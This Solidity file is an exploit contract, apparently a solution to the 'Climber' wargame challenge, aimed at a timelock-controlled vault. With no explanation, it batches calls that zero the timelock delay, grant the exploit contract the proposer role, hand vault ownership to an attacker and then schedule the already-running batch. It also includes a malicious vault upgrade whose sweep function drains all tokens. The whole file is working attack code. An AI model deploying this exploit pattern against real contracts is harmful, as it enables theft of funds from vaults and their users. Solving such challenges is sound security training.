import "./ClimberTimelock.sol";
import "./ClimberVault.sol";

contract Exp {
    address[] targets;
    uint256[] values;
    bytes[] dataElements;
    bytes32 salt;
    address lock;
    address vault;
    address attacker;

    constructor(address _lock, address _vault, address _attacker) {
        lock = _lock;
        vault = _vault;
        attacker = _attacker;
    }
    function attack() external {

        targets.push(lock);
        values.push(0);
        dataElements.push(abi.encodeWithSignature("updateDelay(uint64)", 0));
        
        
        targets.push(lock);
        values.push(0);
        dataElements.push(abi.encodeWithSignature("grantRole(bytes32,address)", keccak256("PROPOSER_ROLE"), address(this)));


                
        targets.push(vault);
        values.push(0);
        dataElements.push(abi.encodeWithSignature("transferOwnership(address)", attacker));


        targets.push(address(this));
        values.push(0);
        dataElements.push(abi.encodeWithSignature("schedule()"));


        ClimberTimelock(payable(lock)).execute(targets, values, dataElements, keccak256("0x12"));
    }

    function schedule()  external{
        ClimberTimelock(payable(lock)).schedule(targets, values, dataElements, keccak256("0x12"));
    }
}

contract ExpClimberVault  is ClimberVault {

    function sweep(address tokenAddress) onlyOwner external  {
        IERC20 token = IERC20(tokenAddress);
        require(token.transfer(msg.sender, token.balanceOf(address(this))), "Transfer failed");
    }
}